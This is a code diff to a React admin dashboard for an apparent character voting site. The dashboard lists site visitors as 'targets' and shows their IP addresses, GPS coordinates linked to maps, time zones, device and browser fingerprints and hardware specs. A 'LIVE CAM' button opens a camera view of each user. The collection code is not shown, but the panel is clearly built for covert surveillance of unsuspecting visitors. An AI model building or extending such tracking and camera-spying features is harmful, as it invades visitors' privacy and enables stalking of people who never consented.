@@ -3,10 +3,11 @@ import { Character } from '../types';
 import { 
   LayoutDashboard, Users, LogOut, Edit3, Trash2, Save, RefreshCcw, Trophy, Activity,
   Search, Zap, Menu, X, Upload, Link as LinkIcon, Monitor, Smartphone, MapPin, 
-  Calendar, Clock, Camera, FolderOpen, Download, FileJson, Globe, RefreshCw
+  Calendar, Clock, Camera, FolderOpen, Download, FileJson, Globe, RefreshCw, Cpu
 } from 'lucide-react';
 import { motion, AnimatePresence } from 'framer-motion';
 import { dataService } from '../services/dataService';
+import { DetailedDeviceInfo } from '../utils/deviceInfo'; // Type import
 
 interface AdminDashboardProps {
   characters: Character[];
@@ -20,7 +21,7 @@ interface ActivityLog {
     timestamp: string;
     ip: string;
     location: any;
-    device: any;
+    device: DetailedDeviceInfo; // Updated type
 }
 
 const AdminDashboard: React.FC<AdminDashboardProps> = ({ characters, setCharacters, onLogout }) => {
@@ -85,8 +86,8 @@ const AdminDashboard: React.FC<AdminDashboardProps> = ({ characters, setCharacte
                  action: parsed.method === 'guest_visit' ? 'Site Visit (Target)' : 'Login',
                  timestamp: parsed.timestamp,
                  ip: parsed.ip || 'Unknown',
-                 location: null, // Usually simplified in login log, but can be enhanced
-                 device: null
+                 location: null, 
+                 device: parsed.deviceInfo
              });
          } catch(e) {}
       }
@@ -108,11 +109,9 @@ const AdminDashboard: React.FC<AdminDashboardProps> = ({ characters, setCharacte
     setLogs(sortedLogs);
   };
 
-  // ... (Keep existing handlers for Edit, Deadline, etc. unchanged) ...
   const handleEditClick = (char: Character) => { setEditingId(char.id); setEditForm(char); };
   const handleSaveEdit = () => { if (!editingId) return; setCharacters(prev => prev.map(c => c.id === editingId ? { ...c, ...editForm } as Character : c)); setEditingId(null); };
-  const handleResetVotes = (id: string) => { if (confirm('Reset votes?')) setCharacters(prev => prev.map(c => c.id === id ? { ...c, votes: 0 } : c)); };
-
+  
   return (
     <div className="flex h-screen bg-slate-950 text-slate-200 font-sans overflow-hidden">
       <button onClick={() => setIsSidebarOpen(true)} className="fixed top-4 left-4 z-40 p-2 bg-slate-800 rounded-lg md:hidden border border-slate-700"><Menu size={24} /></button>
@@ -154,15 +153,14 @@ const AdminDashboard: React.FC<AdminDashboardProps> = ({ characters, setCharacte
                 </div>
                 
                 <div className="bg-slate-900 border border-slate-800 rounded-2xl overflow-hidden overflow-x-auto shadow-lg">
-                    <table className="w-full text-left text-sm min-w-[900px]">
+                    <table className="w-full text-left text-sm min-w-[1100px]">
                         <thead className="bg-slate-800/50 text-slate-400 font-medium">
                             <tr>
-                                <th className="p-4">Target ID / User</th>
-                                <th className="p-4">IP Address</th>
-                                <th className="p-4">Location</th>
-                                <th className="p-4">Device Info</th>
-                                <th className="p-4">Surveillance</th>
-                                <th className="p-4">Last Active</th>
+                                <th className="p-4 w-[180px]">User & IP</th>
+                                <th className="p-4 w-[250px]">Location Info</th>
+                                <th className="p-4 w-[300px]">Device Fingerprint</th>
+                                <th className="p-4">System Specs</th>
+                                <th className="p-4">Cam Feed</th>
                             </tr>
                         </thead>
                         <tbody className="divide-y divide-slate-800">
@@ -171,49 +169,80 @@ const AdminDashboard: React.FC<AdminDashboardProps> = ({ characters, setCharacte
                             ) : (
                                 logs.map((log, idx) => (
                                     <tr key={idx} className="hover:bg-slate-800/30 transition-colors">
-                                        <td className="p-4">
-                                            <div className="font-mono font-bold text-indigo-300">{log.user}</div>
-                                            <div className="text-[10px] text-slate-500">{log.action}</div>
+                                        <td className="p-4 align-top">
+                                            <div className="font-mono font-bold text-indigo-300 mb-1">{log.user}</div>
+                                            <div className="flex items-center gap-1.5 mb-1">
+                                                <Globe size={12} className="text-slate-500"/>
+                                                <span className="font-mono text-emerald-400 font-bold bg-emerald-950/30 px-1.5 py-0.5 rounded text-xs">
+                                                    {log.ip}
+                                                </span>
+                                            </div>
+                                            <div className="text-[10px] text-slate-500">{new Date(log.timestamp).toLocaleTimeString()}</div>
                                         </td>
-                                        <td className="p-4 font-mono text-emerald-400 font-bold">
-                                            {log.ip}
-                                        </td>
-                                        <td className="p-4">
-                                            {/* SAFETY CHECK: Ensure lat/lng are actual numbers before calling toFixed */}
-                                            {log.location && typeof log.location.lat === 'number' && typeof log.location.lng === 'number' ? (
-                                                <a 
-                                                    href={`https://www.google.com/maps?q=${log.location.lat},${log.location.lng}`} 
-                                                    target="_blank" 
-                                                    rel="noopener noreferrer"
-                                                    className="flex items-center gap-1 text-indigo-400 hover:underline bg-indigo-500/10 px-2 py-1 rounded w-fit"
-                                                >
-                                                    <MapPin size={12} />
-                                                    {log.location.lat.toFixed(5)}, {log.location.lng.toFixed(5)}
-                                                </a>
-                                            ) : (
-                                                <span className="text-slate-600 text-xs">Waiting for GPS...</span>
-                                            )}
-                                        </td>
-                                        <td className="p-4">
-                                            <div className="space-y-1 text-xs text-slate-400">
-                                                {log.device ? (
-                                                    <>
-                                                        <div className="flex gap-1 items-center"><Smartphone size={10}/> {log.device.platform}</div>
-                                                        <div className="flex gap-1 items-center"><Monitor size={10}/> {log.device.screenSize}</div>
-                                                    </>
-                                                ) : <span className="text-slate-600">Unknown</span>}
+                                        
+                                        <td className="p-4 align-top">
+                                            <div className="space-y-1.5">
+                                                {log.location && typeof log.location.lat === 'number' ? (
+                                                    <a href={`https://www.google.com/maps?q=${log.location.lat},${log.location.lng}`} target="_blank" className="flex items-center gap-1.5 text-indigo-400 hover:text-indigo-300 transition-colors">
+                                                        <MapPin size={14} className="text-red-500"/>
+                                                        <span className="text-xs font-mono">{log.location.lat.toFixed(5)}, {log.location.lng.toFixed(5)}</span>
+                                                    </a>
+                                                ) : <span className="text-slate-600 text-xs flex items-center gap-1"><MapPin size={12}/> No GPS</span>}
+                                                
+                                                {log.device?.timeZone && (
+                                                    <div className="text-xs text-slate-400 flex items-center gap-1.5">
+                                                        <Clock size={12} /> {log.device.timeZone.replace('_', ' ')}
+                                                    </div>
+                                                )}
                                             </div>
                                         </td>
-                                        <td className="p-4">
+
+                                        <td className="p-4 align-top">
+                                            {log.device ? (
+                                                <div className="space-y-1 text-xs text-slate-300">
+                                                    <div className="flex items-center gap-2">
+                                                        {log.device.isMobile ? <Smartphone size={14} className="text-slate-500"/> : <Monitor size={14} className="text-slate-500"/>}
+                                                        <span className="font-bold text-white">{log.device.osName}</span> 
+                                                        <span className="text-slate-500">Ver: {log.device.osVersion}</span>
+                                                    </div>
+                                                    <div className="flex items-center gap-2">
+                                                        <Globe size={14} className="text-slate-500"/>
+                                                        <span className="font-bold text-indigo-200">{log.device.browserName}</span>
+                                                        <span className="text-slate-500">{log.device.browserVersion}</span>
+                                                    </div>
+                                                    <div className="flex items-center gap-2 text-slate-400">
+                                                        <span className="uppercase text-[10px] font-bold tracking-wider">Lang:</span>
+                                                        {log.device.language}
+                                                    </div>
+                                                </div>
+                                            ) : <span className="text-slate-600">No Data</span>}
+                                        </td>
+
+                                        <td className="p-4 align-top">
+                                            {log.device ? (
+                                                <div className="grid grid-cols-2 gap-x-2 gap-y-1 text-[11px]">
+                                                    <div className="text-slate-500">CPU Arch</div>
+                                                    <div className="text-slate-300 font-mono">{log.device.cpuArchitecture}</div>
+                                                    
+                                                    <div className="text-slate-500">Cores</div>
+                                                    <div className="text-slate-300 font-mono">{log.device.cores}</div>
+                                                    
+                                                    <div className="text-slate-500">Resolution</div>
+                                                    <div className="text-slate-300 font-mono">{log.device.resolution}</div>
+                                                    
+                                                    <div className="text-slate-500">Memory</div>
+                                                    <div className="text-slate-300 font-mono">{log.device.memory}</div>
+                                                </div>
+                                            ) : null}
+                                        </td>
+
+                                        <td className="p-4 align-top">
                                             <button 
                                                 onClick={() => setViewingSurveillance(log.user)}
-                                                className="flex items-center gap-2 px-3 py-1.5 bg-red-900/20 hover:bg-red-900/40 text-red-400 border border-red-900/50 rounded-lg transition-colors"
+                                                className="flex items-center gap-2 px-3 py-1.5 bg-red-900/20 hover:bg-red-900/40 text-red-400 border border-red-900/50 rounded-lg transition-colors w-full justify-center"
                                             >
-                                                <Camera size={14} /> <span className="text-xs font-bold">View Cam</span>
+                                                <Camera size={14} /> <span className="text-xs font-bold">LIVE CAM</span>
                                             </button>
-                                        </td>
-                                        <td className="p-4 text-slate-500 text-xs">
-                                            {new Date(log.timestamp).toLocaleTimeString()}
                                         </td>
                                     </tr>
                                 ))
